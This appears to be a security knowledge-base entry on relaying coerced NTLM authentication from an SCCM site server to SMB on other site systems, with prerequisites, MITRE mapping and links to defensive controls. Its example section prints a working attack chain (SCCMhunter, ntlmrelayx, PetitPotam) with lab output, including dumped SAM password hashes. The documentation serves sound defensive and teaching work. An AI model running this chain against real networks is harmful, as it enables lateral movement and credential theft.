# ELEVATE-1

## Description
NTLM relay site server to SMB on site systems

## MITRE ATT&CK Tactics
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation

## Requirements

### Coercion
- Valid Active Directory domain credentials
- Connectivity to SMB (TCP/445) on a coercion target:
    - ELEVATE-1.1: Primary site server 
    - ELEVATE-1.2: Passive site server
- Connectivity from the coercion target to SMB (TCP/445) on the relay server
- Coercion target settings:
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server [DEFAULT]
    - `RestrictNTLMInDomain` = `0` or not present, or = `X` and `DCAllowedNTLMServers` contains attacker relay server [DEFAULT]
    - `RestrictSendingNTLMTraffic` = `0` or not present, or = `1` and `ClientAllowedNTLMServers` contains attacker relay server [DEFAULT]
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target [DEFAULT]

### Relay
- Relay target settings:
    - Connectivity from the relay server to SMB (TCP/445) on the relay target
    - `RequireSecuritySignature` = `0` or not present [DEFAULT]
    - `RestrictReceivingNTLMTraffic` = `0` or not present [DEFAULT]
    - Coercion target is local admin (to access RPC/admin shares)
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target [DEFAULT]
    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target [DEFAULT]

## Summary
SCCM uses the site system installation account to install and maintain roles on new or existing site system servers. By default, this account is the site server's domain compuper account and requires [local administrator permissions](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/accounts#site-system-installation-account) for and network access to the target systems. An attacker could coerce NTLM authentication from the site server's domain computer account and relay it to SMB on remote site systems in the same site to move laterally and elevate privileges.

## Impact
Impact for these scenarios is difficult to quantify. In some cases a compromised site system role could lead to hierarchy takeover, while in others a successful attack is simply a lateral movement opportunity.

## Defensive IDs
- [DETECT-1: Monitor site server domain computer accounts authenticating from another source](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
- [PREVENT-12: Require SMB signing on site systems](../../../defense-techniques/PREVENT/PREVENT-12/prevent-12_description.md)
- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)


## Subtechniques
- ELEVATE-1.1: NTLM relay primary site server SMB to SMB on remote site systems
- ELEVATE-1.2: NTLM relay passive site server SMB to SMB on remote site systems

## Examples
1. On the attacker host, identify and profile SCCM assets with `SCCMhunter`. The output below is snipped from the output of the SMB module. From the results, *SCCM.INTERNAL.LAB* is identified as a site server in the *LAB* site with multiple hosts from the same site hosting various site system roles:

```
[21:33:30] INFO     [+] Finished profiling all discovered computers.
[21:33:30] INFO     +-----------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                    | Hostname              | SiteCode   | SigningStatus   | SiteServer   | ManagementPoint   | DistributionPoint   | SMSProvider   | WSUS   | MSSQL   |
                    +=======================+============+=================+==============+===================+=====================+===============+========+=========+
                    | sccm2.internal.lab    | ABC        | False           | True         | False             | False               | True          | False  | True    |
                    +-----------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                    | sccm.internal.lab     | LAB        | False           | True         | True              | False               | True          | False  | False   |
                    +-----------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                    | active.internal.lab   | ACT        | False           | True         | False             | False               | True          | False  | False   |
                    +-----------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                    | cas.internal.lab      | CAS        | False           | True         | False             | False               | True          | False  | True    |
                    +-----------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                    | passive.internal.lab  | ACT        | False           | False        | False             | False               | True          | False  | True    |
                    +-----------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                    | mp2.internal.lab      | ABC        | False           | False        | True              | False               | False         | False  | False   |
                    +-----------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                    | mp.internal.lab       | LAB        | False           | False        | True              | False               | False         | False  | False   |
                    +-----------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                    | share.internal.lab    | None       | False           | False        | False             | False               | False         | False  | False   |
                    +-----------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                    | sql2.internal.lab     | None       | False           | False        | False             | False               | False         | False  | True    |
                    +-----------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                    | wsus.internal.lab     | None       | False           | False        | False             | False               | False         | True   | False   |
                    +-----------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                    | provider.internal.lab | None       | False           | False        | False             | False               | True          | False  | False   |
                    +-----------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                    | dp.internal.lab       | LAB        | False           | False        | False             | True                | False         | False  | False   |
                    +-----------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
```

2. Start `ntlmrelayx`, targeting all of the discovered *LAB* site systems.  For this example, no additional flags are provided and the tool will simply attempt to dump hashes on the target system:

```
└─# ntlmrelayx.py -tf sccm_lab_targets.txt  -smb2support
Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra

[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
```

3. Coerce authentication from the target site server to the attacker host's IP address:
```
└─# python3 PetitPotam.py -u lowpriv -p x 10.10.100.136 10.10.100.9 -d internal.lab

Trying pipe lsarpc
[-] Connecting to ncacn_np:10.10.100.9[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```


4. Authentication is captured and relayed in the context of the *SCCM.INTERNAL.LAB* site sever and SAM hashes recovered from the target systems:
```
[*] Servers started, waiting for connections
[*] Received connection from LAB/SCCM$ at SCCM, connection will be relayed after re-authentication
[*] SMBD-Thread-5 (process_request_thread): Connection from LAB/SCCM$@10.10.100.9 controlled, attacking target smb://mp.internal.lab
[*] Authenticating against smb://mp.internal.lab as LAB/SCCM$ SUCCEED
[*] SMBD-Thread-5 (process_request_thread): Connection from LAB/SCCM$@10.10.100.9 controlled, attacking target smb://dp.internal.lab
[*] Authenticating against smb://dp.internal.lab as LAB/SCCM$ SUCCEED
[*] SMBD-Thread-5 (process_request_thread): Connection from LAB/SCCM$@10.10.100.9 controlled, attacking target smb://wsus.internal.lab
[*] Authenticating against smb://wsus.internal.lab as LAB/SCCM$ SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] SMBD-Thread-5 (process_request_thread): Connection from LAB/SCCM$@10.10.100.9 controlled, attacking target smb://sql.internal.lab
[*] Starting service RemoteRegistry
[*] Authenticating against smb://sql.internal.lab as LAB/SCCM$ SUCCEED
[*] SMBD-Thread-5 (process_request_thread): Connection from LAB/SCCM$@10.10.100.9 controlled, but there are no more targets left!
[*] Target system bootKey: 0x18857e9d98d6b4af4b37f17387e10d6f
[*] Received connection from LAB/SCCM$ at SCCM, connection will be relayed after re-authentication
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[*] Target system bootKey: 0xc8d88ef826d2fc47e1b3ca4d606f0d8e
[*] Target system bootKey: 0xf81f8be7c4c43d38858d17318ffa025e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:235cfbc68b5c69f0edbe940ec9952c62:::
[*] Done dumping SAM hashes for host: mp.internal.lab
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7baa5572c1466854e3ecddc8c58941e3:::
[*] Done dumping SAM hashes for host: wsus.internal.lab
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:26f78b6fd483ddd6c54497e6ffbffbc2:::
[*] Done dumping SAM hashes for host: sql.internal.lab
[*] Target system bootKey: 0xd53a55d9f3e6936f8ec20d5ed7288c29
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6d27d961da4a806f274e042f38ee0d34:::
[*] Done dumping SAM hashes for host: dp.internal.lab
[*] Stopping service RemoteRegistry

```

## References
- Microsoft, [Install site system roles for Configuration Manager](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/install-site-system-roles)
- Microsoft, [Site system installation account](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/accounts#site-system-installation-account)
